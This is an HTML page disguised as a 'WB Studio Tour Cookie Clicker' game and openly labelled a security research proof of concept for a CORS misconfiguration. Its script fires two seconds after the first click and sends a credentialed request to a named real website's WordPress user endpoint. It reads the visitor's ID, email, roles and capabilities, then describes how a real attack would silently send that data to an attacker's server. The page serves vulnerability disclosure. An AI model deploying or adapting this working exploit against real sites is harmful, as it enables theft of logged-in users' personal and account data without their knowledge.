<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WB Studio Tour Cookie Clicker üé¨üç™</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #1a0a0a 0%, #2d1b1b 50%, #3d2b2b 100%);
            color: white;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }
        /* Estrellas animadas */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                radial-gradient(2px 2px at 20% 30%, white, transparent),
                radial-gradient(2px 2px at 60% 70%, white, transparent),
                radial-gradient(1px 1px at 50% 50%, white, transparent),
                radial-gradient(1px 1px at 80% 10%, white, transparent),
                radial-gradient(2px 2px at 90% 60%, white, transparent);
            background-size: 200px 200px;
            animation: stars 50s linear infinite;
            opacity: 0.5;
        }
        @keyframes stars {
            from { background-position: 0 0; }
            to { background-position: 0 200px; }
        }
        .container {
            text-align: center;
            z-index: 1;
            background: rgba(255, 255, 255, 0.05);
            padding: 40px;
            border-radius: 20px;
            backdrop-filter: blur(10px);
            border: 2px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
            max-width: 600px;
        }
        h1 {
            font-size: 3em;
            margin-bottom: 10px;
            text-shadow: 0 0 20px rgba(255, 255, 255, 0.8);
            animation: glow 2s ease-in-out infinite alternate;
        }
        @keyframes glow {
            from { text-shadow: 0 0 20px rgba(255, 255, 255, 0.5); }
            to { text-shadow: 0 0 30px rgba(255, 255, 255, 1), 0 0 40px #FF6B6B; }
        }
        .subtitle {
            font-size: 1.2em;
            color: #FF6B6B;
            margin-bottom: 30px;
        }
        .score-display {
            font-size: 4em;
            font-weight: bold;
            margin: 30px 0;
            color: #FFD700;
            text-shadow: 0 0 20px rgba(255, 215, 0, 0.8);
        }
        .cookie {
            font-size: 10em;
            cursor: pointer;
            display: inline-block;
            transition: transform 0.1s ease;
            filter: drop-shadow(0 0 30px rgba(255, 215, 0, 0.6));
            user-select: none;
        }
        .cookie:hover {
            transform: scale(1.1);
        }
        .cookie:active {
            transform: scale(0.9);
        }
        .stats {
            margin-top: 30px;
            font-size: 1.2em;
            color: #FF6B6B;
        }
        .message {
            margin-top: 20px;
            padding: 15px;
            background: rgba(255, 107, 107, 0.1);
            border: 1px solid rgba(255, 107, 107, 0.3);
            border-radius: 10px;
            font-size: 0.9em;
            line-height: 1.6;
        }
        .click-effect {
            position: fixed;
            font-size: 2em;
            font-weight: bold;
            color: #FFD700;
            pointer-events: none;
            animation: float-up 1s ease-out forwards;
            z-index: 1000;
        }
        @keyframes float-up {
            0% {
                opacity: 1;
                transform: translateY(0);
            }
            100% {
                opacity: 0;
                transform: translateY(-100px);
            }
        }
        .warning {
            margin-top: 30px;
            padding: 15px;
            background: rgba(255, 100, 100, 0.1);
            border: 2px solid rgba(255, 100, 100, 0.3);
            border-radius: 10px;
            font-size: 0.85em;
            text-align: left;
        }
        .warning strong {
            color: #ff6b6b;
            display: block;
            margin-bottom: 5px;
        }
        code {
            background: rgba(255, 255, 255, 0.1);
            padding: 2px 6px;
            border-radius: 3px;
            color: #FFD700;
            font-family: 'Courier New', monospace;
        }
        /* Modal personalizado */
        .modal {
            display: none;
            position: fixed;
            z-index: 9999;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            overflow: auto;
        }
        .modal.show {
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .modal-content {
            background: linear-gradient(135deg, #2d1b1b 0%, #3d2b2b 100%);
            padding: 30px;
            border: 2px solid rgba(255, 100, 100, 0.5);
            border-radius: 15px;
            max-width: 800px;
            max-height: 80vh;
            overflow-y: auto;
            box-shadow: 0 0 50px rgba(255, 100, 100, 0.3);
        }
        .modal-header {
            font-size: 1.5em;
            color: #ff6b6b;
            margin-bottom: 20px;
            text-align: center;
        }
        .modal-body {
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
            line-height: 1.8;
            white-space: pre-wrap;
            color: #fff;
        }
        .modal-close {
            background: #ff6b6b;
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1em;
            margin-top: 20px;
            width: 100%;
            font-weight: bold;
        }
        .modal-close:hover {
            background: #ff5252;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üé¨ WB Studio Tour Cookie Clicker üç™</h1>
        <p class="subtitle">Help collect studio cookies!</p>
        
        <div class="score-display" id="score">0</div>
        
        <div class="cookie" id="cookie" onclick="clickCookie()">üç™</div>
        
        <div class="stats">
            <div>Total clicks: <span id="clicks">0</span></div>
            <div>Cookies per second: <span id="cps">0</span></div>
        </div>
        <div class="message">
            üëæ Click the cookie to earn points<br>
            üéØ How many cookies can you collect?
        </div>
        <div class="warning">
            <strong>‚ö†Ô∏è Security Notice</strong>
            This is a security research PoC. When you click, the game attempts to read
            data from <code>www.wbstudiotour.co.uk</code> to demonstrate a CORS vulnerability.
        </div>
    </div>

    <!-- Modal personalizado -->
    <div id="corsModal" class="modal">
        <div class="modal-content">
            <div class="modal-header" id="modalHeader"></div>
            <div class="modal-body" id="modalBody"></div>
            <button class="modal-close" onclick="closeModal()">Close</button>
        </div>
    </div>

    <script>
        // Game variables
        let score = 0;
        let clicks = 0;
        let exploitExecuted = false;

        // Main click function
        function clickCookie() {
            score++;
            clicks++;
            
            // Update display
            document.getElementById('score').textContent = score;
            document.getElementById('clicks').textContent = clicks;
            
            // Visual effect
            showClickEffect(event);
            
            // Execute exploit on first click
            if (!exploitExecuted) {
                exploitExecuted = true;
                setTimeout(executeCORSExploit, 2000); // 2 seconds after first click
            }
        }

        // Visual click effect
        function showClickEffect(event) {
            const effect = document.createElement('div');
            effect.className = 'click-effect';
            effect.textContent = '+1';
            effect.style.left = event.clientX + 'px';
            effect.style.top = event.clientY + 'px';
            document.body.appendChild(effect);
            
            setTimeout(() => effect.remove(), 1000);
        }

        // ========================================
        // CORS EXPLOIT - Proof of Concept
        // ========================================
        
        function executeCORSExploit() {
            console.log('[CORS PoC] Executing exploit...');
            
            // WB Studio Tour endpoint with CORS misconfiguration
            const targetEndpoint = 'https://www.wbstudiotour.co.uk/wp-json/wp/v2/users/me/';
            
            // Make request with credentials
            fetch(targetEndpoint, {
                method: 'GET',
                credentials: 'include', // ‚Üê This includes the user's cookies
                mode: 'cors',
                headers: {
                    'Accept': 'application/json'
                }
            })
            .then(response => {
                console.log('[CORS PoC] Status:', response.status);
                console.log('[CORS PoC] Headers:', response.headers);
                
                if (!response.ok && response.status !== 401 && response.status !== 403) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                
                return response.json();
            })
            .then(data => {
                handleCORSResponse(data);
            })
            .catch(error => {
                console.error('[CORS PoC] Error:', error);
                handleCORSResponse({
                    error: error.message,
                    note: 'Request failed - check console for details'
                });
            });
        }

        function handleCORSResponse(data) {
            // Check if it's an error response (not authenticated)
            if (data.code === 'rest_forbidden' || 
                data.code === 'rest_not_logged_in' || 
                data.code === 'rest_cannot_view' ||
                data.message) {
                showDemoAlert(data);
            } else if (data.id || data.name || data.email) {
                // Real user data! (authenticated user)
                showSuccessAlert(data);
            } else {
                // Unknown response format
                showDemoAlert(data);
            }
        }

        function showDemoAlert(errorData) {
            const message = `Endpoint: https://www.wbstudiotour.co.uk/wp-json/wp/v2/users/me/

Response received:
${JSON.stringify(errorData, null, 2)}

‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
‚ö†Ô∏è CRITICAL SECURITY ISSUE:

Even though this endpoint requires authentication, I can read the COMPLETE response
due to the CORS misconfiguration on www.wbstudiotour.co.uk.

If you were an authenticated user, instead of this error,
I would see and steal:

* User ID
* Username
* Email address
* Display name
* User roles and capabilities
* Avatar URL
* Registration date
* Any other user profile data

And you would see NOTHING - the game would continue normally
while your data is sent to a server I control.

‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
This is only shown for demonstration purposes.
In a real attack, there would be no notification.`;
            
            showModal('üî¥ CORS VULNERABILITY DEMONSTRATION', message);
        }

        function showSuccessAlert(data) {
            // Extract sensitive information
            const sensitiveData = {
                id: data.id,
                username: data.username,
                name: data.name,
                email: data.email,
                url: data.url,
                description: data.description,
                link: data.link,
                slug: data.slug,
                avatar_urls: data.avatar_urls,
                roles: data.roles,
                capabilities: data.capabilities,
                extra_capabilities: data.extra_capabilities,
                registered_date: data.registered_date,
                meta: data.meta
            };

            const message = `You are logged in to www.wbstudiotour.co.uk!

I can read your complete user data:

${JSON.stringify(sensitiveData, null, 2)}

‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
‚ö†Ô∏è In a real attack, this data would be:

1. Sent to an attacker's server immediately
2. Completely silent (no notification)
3. Stolen while you play the game
4. You would never know it was stolen

Sensitive information exposed:
- User ID: ${data.id || 'N/A'}
- Username: ${data.username || 'N/A'}
- Email: ${data.email || 'N/A'}
- Display Name: ${data.name || 'N/A'}
- Roles: ${data.roles ? data.roles.join(', ') : 'N/A'}

This demonstrates the full impact of the CORS vulnerability.`;
            
            showModal('üéØ USER DATA EXPOSED!', message);
        }

        function showModal(title, content) {
            document.getElementById('modalHeader').textContent = title;
            document.getElementById('modalBody').textContent = content;
            document.getElementById('corsModal').classList.add('show');
        }

        function closeModal() {
            document.getElementById('corsModal').classList.remove('show');
        }

        // Auto-load saved data
        window.onload = function() {
            const saved = localStorage.getItem('wbCookies');
            if (saved) {
                score = parseInt(saved);
                document.getElementById('score').textContent = score;
            }
        };

        // Auto-save
        setInterval(() => {
            localStorage.setItem('wbCookies', score);
        }, 5000);

        console.log('üé¨ WB Studio Tour Cookie Clicker loaded');
        console.log('üëæ Click to start playing');
        console.log('‚ö†Ô∏è  CORS exploit will execute after first click');
        console.log('üéØ Target: https://www.wbstudiotour.co.uk/wp-json/wp/v2/users/me/');
    </script>
</body>
</html>

